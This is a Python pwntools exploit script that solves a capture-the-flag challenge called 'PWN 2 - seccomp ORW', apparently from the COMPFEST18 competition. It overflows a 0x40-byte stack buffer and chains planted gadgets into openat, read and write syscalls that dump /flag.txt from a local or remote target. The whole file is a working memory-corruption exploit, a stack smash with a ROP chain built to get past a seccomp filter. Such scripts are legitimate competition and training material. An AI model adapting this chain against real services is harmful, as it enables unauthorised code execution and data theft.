#!/usr/bin/env python3
# PWN 2 - seccomp ORW.  Works local and remote:
#   python3 solve.py                                     # local ../public/chall
#   python3 solve.py REMOTE HOST=34.1.203.129 PORT=5600
from pwn import *

context.clear(arch='amd64', os='linux')
exe = args.BIN or '../public/chall'
elf = context.binary = ELF(exe, checksec=False)

OFFSET   = 0x48                      # char buf[0x40] + saved rbp
POP_RDI  = elf.sym['gadgets']        # the planted stub, 2 bytes per gadget
POP_RSI  = POP_RDI + 2
POP_RDX  = POP_RDI + 4
POP_RAX  = POP_RDI + 6
SYSCALL  = POP_RDI + 8
PATH     = next(elf.search(b'/flag.txt\0'))
AT_FDCWD = 0xffffffffffffff9c        # -100

io = remote(args.HOST or 'localhost', int(args.PORT or 5600)) if args.REMOTE else process(exe)

# the banner hands us the .bss scratch address; trust it over the symbol table
io.recvuntil(b'Kertas catatan : ')
SCRATCH = int(io.recvline().strip(), 16)
log.info('scratch   %#x', SCRATCH)
log.info('gadgets   %#x', POP_RDI)
log.info('/flag.txt %#x', PATH)


def sys(nr, rdi, rsi, rdx):
    return flat(POP_RDI, rdi, POP_RSI, rsi, POP_RDX, rdx, POP_RAX, nr, SYSCALL)


payload  = b'A' * OFFSET
payload += sys(constants.SYS_openat, AT_FDCWD, PATH, 0)      # -> fd 3
payload += sys(constants.SYS_read,   3, SCRATCH, 0x80)
payload += sys(constants.SYS_write,  1, SCRATCH, 0x80)
payload += sys(constants.SYS_exit_group, 0, 0, 0)            # clean teardown
assert len(payload) == OFFSET + 4 * 72 == 360
assert len(payload) <= 0x200

io.sendafter(b'pesan  > ', payload)

out = io.recvall(timeout=5)
print(out.decode(errors='replace'))
flag = re.search(rb'COMPFEST18\{[^}]*\}', out)
if flag:
    log.success(flag.group().decode())
else:
    log.failure('no flag in output')
